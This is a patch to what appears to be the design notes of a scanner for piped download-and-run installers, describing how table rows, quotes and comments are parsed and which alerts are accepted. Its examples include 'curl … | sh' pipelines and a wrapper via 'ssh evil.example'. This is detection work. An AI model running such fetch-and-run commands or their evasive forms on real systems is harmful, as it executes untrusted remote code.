@@ -98,18 +98,72 @@ paths:
       every reading of the first three is tried and any one that finds a wrapper counts); the start and the end of an HTML block element are the end of a clause (`<td>uv</td><td><code>curl …`,
       `<li>docker<br><code>curl …`, `<b>docker</b>: …`: a tool's name in its own element is a heading, not a wrapper), HTML entities
       are decoded first (`<b>docker</b>&nbsp;<code>…`), the cells of a Markdown table row in front of the command are not part of
-      it (`| docker | <code>curl … \| sh</code> |`; the closing pipe of the row is not a second command, and, for the SOFTENING only (never the
-      scan: a shell can start a line with `|` inside a multi-line quoted argument), a line that starts with `|` is a row, so
-      `_join_lines(tables=True)` never joins it to the next line: a table of several rows, or a row before a paragraph, reads the
-      same as a single row; a one-column row counts when it also ENDS in a pipe, `| <code>curl … \| sh</code> |`; the
-      cells are plain text: a lone quote, `;`, `&&`, `$(`, a backslash, or a cell that ends in `>` makes the line shell syntax that
-      STARTS with a pipe, as `echo 'a⏎| b' ; evil | curl …` or `>|f evil | curl …`, so its "cells" are read, and an `evil` among
-      them is a stage (balanced code spans and double quotes, a `$HOME`, an `&amp;` are plain: `| \`uv\` | <code>curl …</code> |`): the
-      oracle covers this one. A pipe at the end of a line does not join the next line when that one starts with `|` (a table
-      row, never a shell pipeline). The softening and the scan read the text differently around table rows, so a form whose
-      MATCHES (the matched texts, not their number: `curl EVIL | tee >(sh) |⏎curl D | sh` is one match to the scan and `curl D | sh`
-      to the softening) differ between the two readings is not softened: an installer beside a payload only the scan sees cannot
-      soften it). A blockquote marker on a continuation line (`> curl … |⏎> sh`) is not part of the command), and a list marker, an arrow or an ASCII label glued
+      it (`| docker | <code>curl … \| sh</code> |`; the closing pipe of the row is not a second command). The scan and the softening
+      read ONE text, `_join_lines`, in which the closing pipe of a table row (`_is_table_row`: a line that starts with `|` and a
+      plain first cell, `_TABLE_ROW_RE`, and `_reads_as_shell` is false), a pipe on a line of its own behind
+      only quote markers (`> |`), and a pipe followed by a line that starts with `|` or `> |` join nothing: a table of several rows, or a
+      row before a paragraph, reads the same as a single row. A shell can start a line with a pipe only inside a construct
+      opened above (a string, a here-document, `$((…))`, `${…}`, a backtick substitution; anywhere else it is a syntax error),
+      and the pipe at the end of that line is a live one only if the line closes the construct or opens a command of its own.
+      So `_reads_as_shell` is true for a line with a quote character, however it is escaped, doubled or glued to letters (`'\''`,
+      `\'`, `\"`, `"'"`, `foo'bar`); a `)`, `}` or `]` that does not close the bracket opened last on the line (brackets must
+      nest, a backslash makes the next character an ordinary one except before a quote, a `{` opens a `}` only as an unescaped,
+      undoubled `${` because it is a literal anywhere else, and the brackets between a pair of backticks are that substitution's
+      own and are not counted); an odd number of backticks; or a `$(`, `<(` or `>(` still open at the end of the line
+      (`bash <(curl …)` closes on it and is text). Such a line is joined like any pipeline, and an `evil` in front of it is a
+      stage: the same test guards the cells `_soften_prose` drops in front of a command, so `| } evil | curl docker | sh` is not
+      a documented installer. `_CONTINUATION_RE` reads a `#` after a pipe as a comment and swallows the rest of the line; where a492ab2
+      called the line a row (`_TABLE_ROW_COMPAT_RE`, no quote in front of the `#`, not a continued line) and `_is_table_row` does
+      not (a closer or an opener in it), `_join_lines` leaves the swallowed text as it was, because it may be text of a string
+      above (`| b ) | # c' ; curl X | sh`), and appends the pipeline joined at the end of the text (so nothing the original lines hold moves: a `$(` that ends the line still meets the `curl` below it, and the lines keep their count), because the `#` may be the comment of a
+      command the line opened (`| a | $(curl X | # c⏎sh)`, which a492ab2 missed) or comment lines may follow the live pipe, and `enclosed` takes a pipe-led line that holds a quote and a wrapper, within 60 lines of a line that
+      left a quote odd, to open the wrapper's argument (which quote closes the string above depends on escapes, `$'…'` and
+      word-internal apostrophes, so it is not guessed): `echo 'a⏎| b | c' ; evil | ssh evil.example '⏎curl … | sh⏎'` is not a
+      documented installer, and a row with a wrapper and no quote is not an opener. A `+` in front of the pipe is a diff marker in a patch (`diff=True`: the segments of kind `file`, and `scan_diff` and the
+      planner tool, whose regions are mostly patches; the baseline reads each true channel with its own flag and the union keeps its
+      hit) and a command word in a body, a comment or a title (`diff=False`). The cells of a real row are plain text (a code span, a `$HOME`, an `&amp;`,
+      `(macOS)`, `[docs](url)`: `| \`uv\` | <code>curl …</code> |`). A row with one of the above followed by a paragraph
+      (`| "uv" | <code>…</code> |⏎⏎Done.`, `| Don't | …`, `| {owner}/{repo} | …`, Homebrew's and oh-my-zsh's `"$(curl …)"`
+      cells) joins the paragraph and stays `critical`, and so do a quoted name cell or one with a stray closer in front of the command
+      (`| "uv" | <code>curl … \| sh</code> |`, `| 1) | …`, `| x86_64) | …`, `| {docker} | …`, even alone):
+      an over-alert, accepted, since a `}` could close a `${` above and a quote cannot be counted. Accepted misses: a newline inside
+      `$((…))` or `${…}` among the DOWNLOAD's own arguments (`curl URL?f=$((1⏎| 2)) |⏎sh`) is not read, because the argument
+      window only crosses a newline inside a quoted string; and an even number of backticks in a row whose first one closes a
+      backtick substitution above and whose next opens another (`` echo `echo a⏎| b ` x=`curl X |⏎sh` ``) is read as a row,
+      because no guard tells it from a code span and any guard would make `| \`uv\` | <code>curl … \| sh</code> |` a payload.
+      A cell AFTER the command is a stage of its pipeline unless the command sits in a Markdown backtick span:
+      `| docker | <code>… \| sh</code> | stable |` (also `<pre>`, `<kbd>`, plain text) stays `critical`, an over-alert that
+      predates the row rule (put the command in the last cell). A `+` row inside a fenced ```diff block of a body reads as shell text and stays
+      `critical` (an over-alert, accepted). `_fold_padding` turns a repeated token into one (`)) ))`, `'a 'a`, `+ +`, `| | |`), a blank
+      run into a blank and a token of more than 120 characters into its head and tail; it never removes a newline, so `_soften_prose` keeps
+      the lines as written beside the folded text, and two guards read them. `enclosed` counts the quotes of the last 300 characters of the
+      FOLDED line, as a492ab2 did, and, where the fold collapsed a quote away (`ssh h 'x 'x 'y`, however much padding follows it), of the text
+      those 300 characters were folded from; either one odd opens a wrapper. Where the count is wrong about what a shell does (`\'`, `'\''`,
+      `$'…'`, an apostrophe in a word, one quote kind inside the other) the fold's collapse of `'z 'z` makes the folded count right by
+      accident, so it stays. Neither is the whole line: a quote that is no shell quote far from the end (`"5' tall"` early in a long
+      paragraph) must not pair with the wrapper's. Accepted over-alerts of this reading: `ssh h 'a' 'b 'b⏎curl … | sh⏎'`, whose quotes are
+      even, stays `critical`; and a pipe-led line that holds a quote and a word that runs a command (`docker run -e KEY="v" …`,
+      `bash -c "…"`) within sixty lines of a line that left a quote odd (a possessive plural such as `users'` and a `5"` screen count) makes
+      the documented installers within sixty lines below it `critical`, because it may be the tail of that string and the opener of a
+      wrapper's argument (a492ab2: `medium`). A prefix drop (`| docker | curl …`) removes the FOLDED cells and reads the text they came from
+      as written: `_fold_with_origin` is the fold with the place of every kept character, so the line is read up to the character that
+      follows the cells, and a stray closer or quote the fold merged away (`] ]`, `| | | |`) or a first cell of a hundred blanks is seen.
+      When that character is one the fold made up (a word of more than 120 characters, a padded path) or the fold of the line is not
+      the folded line, nothing is dropped. The command's own cell is not read: `| docker | <code>curl -fsSL "https://…" \| sh</code> |`
+      stays `medium`. `\|` is spelled as a pipe AFTER the fold, as in a492ab2: before it, `curl U \| | sh` (which fetches the URL `|` as
+      well) folds to `curl U | sh`. Known gaps that predate the row rule
+      and are not fixed: `enclosed` counts quotes per line, so a line that closes one string and opens another
+      (`echo 'a⏎b' ; ssh host 'x⏎curl … | sh⏎'`), a `$'…\'…'` string and a wrapper more than 60 lines above are missed; a patch whose
+      removed (`-`) lines or hunk headers sit between `curl U |` and `sh` is not joined; and the single-line sink forms of the download
+      rule (`curl U | >/dev/null sh`, `| { sh; }`, `| setsid sh`, `| xargs -0 sh -c`) are not read.
+      A `#` is also read as a comment where a string above makes it text: the live pipe behind a `#` on a pipe-led line
+      (`echo 'a⏎| b | # c' ; curl X |⏎sh`), a row followed by a `#` line that holds the live pipe, and a `#` after a pipe on a line that
+      does not start with one; a lone CR is a line break to the rules and part of the word to a shell (`echo hi\r| b | curl X |⏎sh`).
+      The joined line appended for a swallowed `#` takes only the next physical line, so a chain behind it (a comment line, then a
+      backslash continuation, then the sink) is not joined.
+      A single-pipe prefix counts only when the row also ends in `|`. A one-column row whose cell holds
+      the command, followed by a paragraph, joins that paragraph and stays critical (an over-alert, accepted). A blockquote marker
+      on a continuation line (`> curl … |⏎> sh`) is not part of the command), and a list marker, an arrow or an ASCII label glued
       to the word is dropped too (`1)docker`, `a)docker`, `[1]docker`, `=>docker`, `Step 1:docker`, `Step-1:docker`, `安裝:docker`,
       `Run:./evil`); a lone `>` read as a breadcrumb starts the command after it, and past the third one followed by a program, a path
       or a wrapper with a glued operator is a breadcrumb and any other is a redirect (a bare relative path with a `/` is a program only as the
@@ -233,7 +287,8 @@ paths:
   capturing caller such as `eval` would run), and a guard whose removal only ADDS alerts (a closing tag or a parenthetical
   after the shell not being a script operand, a typographic quote before `curl`, `_x_` before the command, `~=3.9` being a
   version, the label-with-a-path alternative, the `<code>` span conversion, the opening and closing tag clause ends, the closing
-  pipe of a table row, the table-row rule of `_join_lines`, entity decoding of the lead, a footnote marker glued to a
+  pipe of a table row, the table-row rule of `_join_lines` (a table-row-looking line that is really a payload is oracle-covered, bar the accepted misses and known gaps above: `LEADING_PIPE` for the recall property, `PIPE_LEADS` for the soundness one: an `evil` stage, or a quote left open, in front of a documented installer),
+  entity decoding of the lead, a footnote marker glued to a
   link: a shell runs `[1]docker`, which is no program): the oracle sees under-detection and unsafe softening, never extra alerts. Those and `real_subst`
   are pinned by unit tests instead.
 - **Linear is the requirement; the constant is measured.** The download rules run four windowed patterns per
